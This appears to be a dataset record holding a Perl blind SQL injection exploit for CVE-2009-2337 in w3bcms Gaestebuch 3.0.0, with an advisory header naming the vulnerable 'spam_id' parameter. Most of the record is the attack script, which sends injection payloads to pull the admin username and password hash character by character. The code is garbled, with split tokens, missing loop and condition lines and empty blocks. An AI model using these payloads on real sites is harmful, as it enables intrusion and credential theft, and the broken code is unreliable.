{
    "text": "vul_name : w3bcms Gaestebuch 3.0.0 Blind SQL Injection Exploit ， vul_cve : CVE-2009-2337 ， vul_poc :  #  ! /usr/bin/perl ， use LWP : UserAgent ;  ， use HTTP : Request : Common qw ( POST )  ;  ， use Getopt : Long ;  ，  # \\ # ' # / ，  #  ( -.- )  ，  # -oOO- ( _ ) -OOo- ，  #  | _ _ |  ，  #  | _/ /_ _/ /_ _ _ _ |  ，  #  | / _/ _/ _ `/ _/ _ \\/ / / / _ `/ _/ |  ，  #  |  ( _ ) /_/ /_/ / / / /_/ / /_/ / /_/ ( _ )  |  ，  #  | /_/\\_/\\_ , _/_/ /_._/\\_ , _/\\_ , /_/ |  ，  #  | Security Research Division /_/ 2oo9 |  ，  #  | w3bcms Gaestebuch v3.0.0 Blind SQL Injection |  ，  #  |  ( requires magic_quotes_gpc = Off )  |  ，  #  [  !  ] Discovered. : DNX ，  #  [  !  ] Vendor. :  ，  #  [  !  ] Detected. : 26.03.2009 ，  #  [  !  ] Reported. : 29.03.2009 ，  #  [  !  ] Response. : xx.xx.2009 ，  #  [  !  ] Background. : CMS features in the frontend :  ，  # & # 187 ; Ausgabe angelegter Seiten ，  # & # 187 ; Integrierter sicherer Spamschutz ( kein Captcha !  )  ，  # & # 187 ; CMS Features wie Slogan Rotation , Datumausgabe , Seitenanzeige ，  # & # 187 ; Integrierter Besuchercounter ( versteckt/sichtbar )  ，  # <b>& # 187 ; Sicherheit gegen Hackangriffe</b> ，  # & # 187 ; Schnelle Datenbankabfragen ，  # & # 187 ; 100% Suchmaschinenoptimiert ( SEO )  ，  # & # 187 ; Erweiterbar durch Module & Addons ，  # & # 187 ; Unterst& # 195 ; & # 188 ; tzt Mod Rewrite URL's ( optional )  ，  #  [  !  ] Bug. :  $ _POST [ 'spam_id' ] in includes/module/book/index.inc.php near line 42 ，  # 37 : } else if ( isset (  $ _GET [ 'action' ]  )  $ _GET [ 'action' ] = \"eintragen\" $ modul_settings [ 'aktiv' ] = \"0\" ) { ，  # 38 :  ，  # 39 :  $ _POST [ 'spamschutz' ] = mysql_real_escape_string (  $ _POST [ 'spamschutz' ]  )  ;  ，  # 40 :  $ _POST [ 'spamschutz' ] = strtolower (  $ _POST [ 'spamschutz' ]  )  ;  ，  # 41 :  ，  # 42 :  $ data = mysql_fetch_assoc ( mysql_query ( \"SELECT * FROM spamschutz WHERE id='\". $ _POST [ 'spam_id' ] .\"' AND antwort='\". $ _POST [ 'spamschutz' ] .\"'\" )  ;  ，  #  [  !  ] Solution. : no response from vendor but the vendor has updated the module package ， { ， print \"\\n \\ # ' # / \" ;  ， print \"\\n ( -.- ) \" ;  ， print \"\\n -oOO- ( _ ) -OOo-\" ;  ， print \"\\n | w3bcms Gaestebuch v3.0.0 Blind SQL Injection | \" ;  ， print \"\\n | coded by DNX | \" ;  ， print \"\\n -\" ;  ， print \"\\n [  !  ] Usage : perl w3bcms.pl [ Target ] <Options>\" ;  ， print \"\\n [  !  ] Example : perl w3bcms.pl -2 -u \\\" ， print \"\\n [  !  ] Targets : \" ;  ， print \"\\n -1 Get admin username\" ;  ， print \"\\n -2 Get admin password hash\" ;  ， print \"\\n [  !  ] Options : \" ;  ， print \"\\n -u [ url ] URL to vuln website\" ;  ， print \"\\n -p [ ip : port ] Proxy support\" ;  ， print \"\\n\" ;  ， exit ;  ， } ， my %options = (  )  ;  ， GetOptions ( \\%options , \"1\" , \"2\" , \"u=s\" , \"p=s\" )  ;  ， my $ ua = LWP : UserAgent->new (  )  ;  ， my $ target = $ options{\"u\"}.\"&action=eintragen\" ;  ， { ，  $ ua->proxy ( 'http' , \" ， } ， print \" [  !  ] Exploiting.\\n\" ;  ， check_bug (  $ target )  ;  ， elsif (  $ options{\"2\"} ) { get_password (  $ target )  ; } ， print \"\\n [  !  ] Exploit done\\n\" ;  ， sub check_bug ， { ， my $ url = shift ;  ， syswrite ( STDOUT , \" [  !  ] Checking bug @ website : \" , 28 )  ;  ， my $ inj = \"' or 1=1/ * \" ;  ， my $ req = POST $ url ,  [ spam_id => $ inj ]  ;  ， my $ res = $ ua->request (  $ req )  ;  ， { ， syswrite ( STDOUT , \"vuln\" , 4 )  ;  ， print \"\\n\" ;  ， } ， { ， syswrite ( STDOUT , \"not vuln\" , 8 )  ;  ， exit ;  ， } ， } ， sub get_username ， { ， my $ target = shift ;  ， syswrite ( STDOUT , \" [  !  ] Get username : \" , 18 )  ;  ， { ， my $ found = 0 ;  ， my $ h = 32 ;  ， { ， { ，  $ found = 1 ;  ， syswrite ( STDOUT , chr (  $ h )  , 1 )  ;  ， } ，  $ h+ ;  ， } ， } ， } ， sub get_password ， { ， my $ target = shift ;  ， syswrite ( STDOUT , \" [  !  ] Get Hash : \" , 14 )  ;  ， { ， my $ found = 0 ;  ， my $ h = 48 ;  ， { ， { ，  $ found = 1 ;  ， syswrite ( STDOUT , chr (  $ h )  , 1 )  ;  ， } ， { ，  $ h = 97 ;  ， } ， { ，  $ h+ ;  ， } ， } ， } ， } ， sub exploit ， { ， my $ url = shift ;  ， my $ i = shift ;  ， my $ h = shift ;  ， my $ c = shift ;  ， my $ inj = \"' or 1=1 and substring ( select \". $ c.\" FROM admin limit 1 )  , \". $ i.\" , 1 ) =CHAR ( \". $ h.\" ) / * \" ;  ， my $ req = POST $ url ,  [ spam_id => $ inj ]  ;  ， my $ res = $ ua->request (  $ req )  ;  ， { ， } ， { ， } ， }",
    "time": "2009.07.12"
}